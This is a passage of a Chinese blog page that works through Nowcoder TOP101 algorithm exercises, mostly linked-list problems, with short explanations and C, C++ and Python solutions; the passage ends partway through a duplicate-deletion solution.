<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">levelOrder</span>(<span class="params">self, root: TreeNode</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        res = []</span><br><span class="line">        q = queue.Queue()</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">bfs</span>():</span></span><br><span class="line">            <span class="keyword">while</span>(q.qsize() != <span class="number">0</span>):</span><br><span class="line">                tmpRoot = q.get()</span><br><span class="line">                res.append(tmpRoot.val)</span><br><span class="line">                <span class="keyword">if</span>(tmpRoot.left != <span class="literal">None</span>):</span><br><span class="line">                    q.put(tmpRoot.left)</span><br><span class="line">                <span class="keyword">if</span>(tmpRoot.right != <span class="literal">None</span>):</span><br><span class="line">                    q.put(tmpRoot.right)</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">None</span>):</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        q.put(root)</span><br><span class="line">        bfs()</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></div></figure>




        <h1 id="牛客TOP101"   >
          <a href="#牛客TOP101" class="heading-link"><i class="fas fa-link"></i></a><a href="#牛客TOP101" class="headerlink" title="牛客TOP101"></a>牛客TOP101</h1>
      
        <h2 id="链表"   >
          <a href="#链表" class="heading-link"><i class="fas fa-link"></i></a><a href="#链表" class="headerlink" title="链表"></a>链表</h2>
      
        <h3 id="链表内指定区间反转"   >
          <a href="#链表内指定区间反转" class="heading-link"><i class="fas fa-link"></i></a><a href="#链表内指定区间反转" class="headerlink" title="链表内指定区间反转"></a>链表内指定区间反转</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221104201440818.png" alt="image-20221104201440818"></p>
<p>使用<code>pre</code>、<code>cur</code>、<code>next</code>三指针进行，需要注意某些特殊条件</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct ListNode* <span class="title">reverseBetween</span><span class="params">(struct ListNode* head, <span class="keyword">int</span> m, <span class="keyword">int</span> n )</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">originHead</span> =</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">pre</span> =</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">cur</span> =</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">tmpHead</span> =</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">lengtHead</span> =</span> head;</span><br><span class="line">    <span class="keyword">if</span> ((n-m) &lt; <span class="number">1</span> || head==<span class="literal">NULL</span>||head-&gt;next==<span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> originHead;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (m == <span class="number">1</span>) &#123;</span><br><span class="line">        tmpHead = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; m - <span class="number">1</span> ; i ++ ) &#123;</span><br><span class="line">        cur = cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n ; i ++ ) &#123;</span><br><span class="line">        pre = pre-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n - m + <span class="number">1</span> ; i ++) &#123;</span><br><span class="line">        next = cur-&gt;next;</span><br><span class="line">        cur-&gt;next = pre;</span><br><span class="line">        pre = cur;</span><br><span class="line">        cur = next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (tmpHead == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> pre;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; m - <span class="number">2</span> ; i ++ ) &#123;</span><br><span class="line">            tmpHead = tmpHead-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        tmpHead-&gt;next = pre;</span><br><span class="line">        <span class="keyword">return</span> originHead;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="链表中的节点每k个一组翻转"   >
          <a href="#链表中的节点每k个一组翻转" class="heading-link"><i class="fas fa-link"></i></a><a href="#链表中的节点每k个一组翻转" class="headerlink" title="链表中的节点每k个一组翻转"></a>链表中的节点每k个一组翻转</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221105090729643.png" alt="image-20221105090729643"></p>
<p>即依照索引，滑动窗口形式进行指定区间翻转，这里要记录一下翻转之前的<code>preHead</code>指针，方便在翻转之后进行连接。</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">struct ListNode<span class="operator">*</span> reverseKGroup(struct ListNode<span class="operator">*</span> head, <span class="type">int</span> k ) &#123;</span><br><span class="line">    if (k <span class="operator">=</span><span class="operator">=</span> <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    struct ListNode<span class="operator">*</span> originHead <span class="operator">=</span> head;</span><br><span class="line">    struct ListNode<span class="operator">*</span> lengtHead <span class="operator">=</span> head;</span><br><span class="line">    struct ListNode<span class="operator">*</span> pre <span class="operator">=</span> head;</span><br><span class="line">    struct ListNode<span class="operator">*</span> cur <span class="operator">=</span> head;</span><br><span class="line">    struct ListNode<span class="operator">*</span> preHead;</span><br><span class="line">    struct ListNode<span class="operator">*</span> nextPreHead <span class="operator">=</span> <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="type">int</span> tmpCount;</span><br><span class="line">    <span class="type">int</span> <span class="keyword">left</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="keyword">right</span> <span class="operator">=</span> <span class="keyword">left</span> <span class="operator">+</span> k <span class="operator">-</span> <span class="number">1</span> ;</span><br><span class="line">    <span class="type">int</span> length <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    while (lengtHead <span class="operator">!=</span> <span class="keyword">NULL</span>) &#123;</span><br><span class="line">        lengtHead <span class="operator">=</span> lengtHead<span class="operator">-</span><span class="operator">&gt;</span>next;</span><br><span class="line">        length <span class="operator">+</span><span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    while (<span class="keyword">right</span> <span class="operator">&lt;=</span> length) &#123;</span><br><span class="line">        tmpCount <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        while (tmpCount <span class="operator">&lt;</span> k) &#123;</span><br><span class="line">            pre <span class="operator">=</span> pre<span class="operator">-</span><span class="operator">&gt;</span>next;</span><br><span class="line">            tmpCount <span class="operator">+</span><span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        struct ListNode<span class="operator">*</span> next;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j <span class="operator">=</span> <span class="number">0</span> ; j <span class="operator">&lt;</span> k; j <span class="operator">+</span><span class="operator">+</span>) &#123;</span><br><span class="line">            if (j <span class="operator">=</span><span class="operator">=</span> <span class="number">0</span>) &#123;</span><br><span class="line">                preHead <span class="operator">=</span> nextPreHead;</span><br><span class="line">                nextPreHead <span class="operator">=</span> cur;</span><br><span class="line">            &#125;</span><br><span class="line">            next <span class="operator">=</span> cur<span class="operator">-</span><span class="operator">&gt;</span>next;</span><br><span class="line">            cur<span class="operator">-</span><span class="operator">&gt;</span>next <span class="operator">=</span> pre;</span><br><span class="line">            pre <span class="operator">=</span> cur;</span><br><span class="line">            cur <span class="operator">=</span> next;</span><br><span class="line">        &#125;</span><br><span class="line">        if (<span class="keyword">left</span> <span class="operator">=</span><span class="operator">=</span> <span class="number">1</span>) &#123;</span><br><span class="line">            originHead <span class="operator">=</span> pre;</span><br><span class="line">        &#125;</span><br><span class="line">        if (preHead <span class="operator">!=</span> <span class="keyword">NULL</span>) &#123;</span><br><span class="line">            preHead<span class="operator">-</span><span class="operator">&gt;</span>next <span class="operator">=</span> pre;</span><br><span class="line">        &#125;</span><br><span class="line">        pre <span class="operator">=</span> cur;</span><br><span class="line">        <span class="keyword">left</span> <span class="operator">+</span><span class="operator">=</span> k;</span><br><span class="line">        <span class="keyword">right</span> <span class="operator">+</span><span class="operator">=</span> k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> originHead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h3 id="链表中环的入口结点"   >
          <a href="#链表中环的入口结点" class="heading-link"><i class="fas fa-link"></i></a><a href="#链表中环的入口结点" class="headerlink" title="链表中环的入口结点"></a>链表中环的入口结点</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221107203805285.png" alt="image-20221107203805285"></p>
<p>快慢指针，参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.nowcoder.com/practice/253d2c59ec3e4bc68da16833f79a38e4?tpId=295&tqId=23449&ru=/exam/oj&qru=/ta/format-top101/question-ranking&sourceUrl=/exam/oj" >链表中环的入口结点_牛客题霸_牛客网 (nowcoder.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<ul>
<li>快指针走两步，慢指针走一步，直至相遇</li>
<li>从相遇点和链表头部再出发，直至相遇，相遇点即为环入口点。</li>
</ul>
<figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">EntryNodeOfLoop</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">fast</span> =</span> head;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">low</span> =</span> head;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">originHead</span> =</span> head;</span><br><span class="line">        <span class="keyword">while</span>(fast&amp;&amp;fast-&gt;next)&#123;</span><br><span class="line">            fast = fast-&gt;next-&gt;next;</span><br><span class="line">            low = low-&gt;next;</span><br><span class="line">            <span class="keyword">if</span>(fast==low)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(fast == <span class="literal">NULL</span> <span class="keyword">or</span> fast-&gt;next == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (originHead != fast)&#123;</span><br><span class="line">            originHead = originHead-&gt;next;</span><br><span class="line">            fast = fast-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> originHead;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>




        <h3 id="删除链表的倒数第n个节点"   >
          <a href="#删除链表的倒数第n个节点" class="heading-link"><i class="fas fa-link"></i></a><a href="#删除链表的倒数第n个节点" class="headerlink" title="删除链表的倒数第n个节点"></a>删除链表的倒数第n个节点</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221108164412584.png" alt="image-20221108164412584"></p>
<p>快慢指针，记得记录<code>pre</code>节点</p>
<figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param pHead ListNode类</span></span><br><span class="line"><span class="comment">     * @param k int整型</span></span><br><span class="line"><span class="comment">     * @return ListNode类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">ListNode* <span class="title">removeNthFromEnd</span><span class="params">(ListNode* pHead, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">fast</span> =</span> pHead;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">pre</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">slow</span> =</span> pHead;</span><br><span class="line">        <span class="keyword">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (fast != <span class="literal">NULL</span> &amp;&amp; tmp != k)&#123;</span><br><span class="line">            fast = fast-&gt;next;</span><br><span class="line">            tmp += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(tmp != k)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (fast != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            fast = fast-&gt;next;</span><br><span class="line">            <span class="keyword">if</span>(pre == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                pre = slow;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                pre = pre-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pre == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> pHead-&gt;next;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            pre-&gt;next = slow-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pHead;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>




        <h3 id="两个链表的第一个公共结点"   >
          <a href="#两个链表的第一个公共结点" class="heading-link"><i class="fas fa-link"></i></a><a href="#两个链表的第一个公共结点" class="headerlink" title="两个链表的第一个公共结点"></a>两个链表的第一个公共结点</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221108164039213.png" alt="image-20221108164039213"></p>
<p>计算长度，参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.nowcoder.com/practice/6ab1d9a29e88450685099d45c9e31e46?tpId=295&tqId=23257&ru=/exam/oj&qru=/ta/format-top101/question-ranking&sourceUrl=/exam/oj?fromPut=ad_baidu_sem_wushuang_bianchengtuoci0810_zaixianbiancheng&bd_vid=12203772359314211200" >两个链表的第一个公共结点_牛客题霸_牛客网 (nowcoder.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/36.gif" alt="36"></p>
<figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">FindFirstCommonNode</span><span class="params">( ListNode* pHead1, ListNode* pHead2)</span> </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">originHead1</span> =</span> pHead1;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">originHead2</span> =</span> pHead2;</span><br><span class="line">        <span class="keyword">while</span>(pHead1 != pHead2)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pHead1 == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                pHead1 = originHead2;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				pHead1 = pHead1-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">            <span class="keyword">if</span>(pHead2  == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                pHead2 = originHead1;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				pHead2 = pHead2-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pHead1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>




        <h3 id="链表的奇偶重排"   >
          <a href="#链表的奇偶重排" class="heading-link"><i class="fas fa-link"></i></a><a href="#链表的奇偶重排" class="headerlink" title="链表的奇偶重排"></a>链表的奇偶重排</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221108163852157.png" alt="image-20221108163852157"></p>
<p>分别简历奇偶链表然后串在一起，注意边界问题</p>
<figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param head ListNode类</span></span><br><span class="line"><span class="comment">     * @return ListNode类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">ListNode* <span class="title">oddEvenList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">NULL</span> || head-&gt;next == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode* oddHead = head;</span><br><span class="line">        ListNode* evenHead = head-&gt;next;</span><br><span class="line">        ListNode* originOddHead = head;</span><br><span class="line">        ListNode* originEvenHead = evenHead;</span><br><span class="line">        <span class="keyword">while</span>(oddHead-&gt;next != <span class="literal">NULL</span> &amp;&amp; evenHead-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            oddHead-&gt;next = oddHead-&gt;next-&gt;next;</span><br><span class="line">            oddHead = oddHead-&gt;next;</span><br><span class="line">            evenHead-&gt;next = evenHead-&gt;next-&gt;next;</span><br><span class="line">            evenHead = evenHead-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        oddHead-&gt;next = originEvenHead;</span><br><span class="line">        <span class="keyword">return</span> originOddHead;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>




        <h3 id="删除有序链表中重复的元素-II"   >
          <a href="#删除有序链表中重复的元素-II" class="heading-link"><i class="fas fa-link"></i></a><a href="#删除有序链表中重复的元素-II" class="headerlink" title="删除有序链表中重复的元素-II"></a>删除有序链表中重复的元素-II</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221109162359368.png" alt="image-20221109162359368"></p>
<ul>
<li><p>预先确定一个头节点<code>preHead</code>以及<code>pre</code>和<code>cur</code>节点，逐次遍历</p>
<figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">preHead = preHead-&gt;next;</span><br><span class="line">cur = cur-&gt;next;</span><br><span class="line">pre = pre-&gt;next;</span><br></pre></td></tr></table></div></figure></li>
<li><p>然后挨个删除重复节点</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if( cur-&gt;val == pre-&gt;val)&#123;</span><br><span class="line">    tmp = cur-&gt;val;</span><br><span class="line">    preHead-&gt;next = pre-&gt;next;</span><br><span class="line">    pre = pre-&gt;next;</span><br><span class="line">    cur = cur-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
<li><p>当碰到不同节点时，判断<code>pre</code>节点是否和存储的重复节点值相等，如果相当，那么<code>pre</code>节点也需要删除</p>
<figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(pre-&gt;val == tmp)&#123;</span><br><span class="line">    preHead-&gt;next = cur;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
</ul>
<p>需要最后<code>cur</code>为NULL时，如果最后一个也需要删除，那么此时由于<code>cur</code>为NULL，所以无法进入<code>while</code>循环中，无法删除，需要在<code>while</code>循环外部进行判断</p>
<figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(pre-&gt;val == tmp)&#123;</span><br><span class="line">    preHead-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>最终结果</p>
<figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param head ListNode类</span></span><br><span class="line"><span class="comment">     * @return ListNode类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">NULL</span> || head-&gt;next == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">preHead</span> =</span> (struct ListNode*) <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">originPreHead</span> =</span> preHead;</span><br><span class="line">        preHead-&gt;next = head;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">pre</span> =</span> head;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">cur</span> =</span> head-&gt;next;</span><br><span class="line">        <span class="keyword">int</span> tmp;</span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>( cur-&gt;val == pre-&gt;val)&#123;</span><br><span class="line">                tmp = cur-&gt;val;</span><br><span class="line">                preHead-&gt;next = pre-&gt;next;</span><br><span class="line">                pre = pre-&gt;next;</span><br><span class="line">                cur = cur-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(pre-&gt;val == tmp)&#123;</span><br><span class="line">                    preHead-&gt;next = 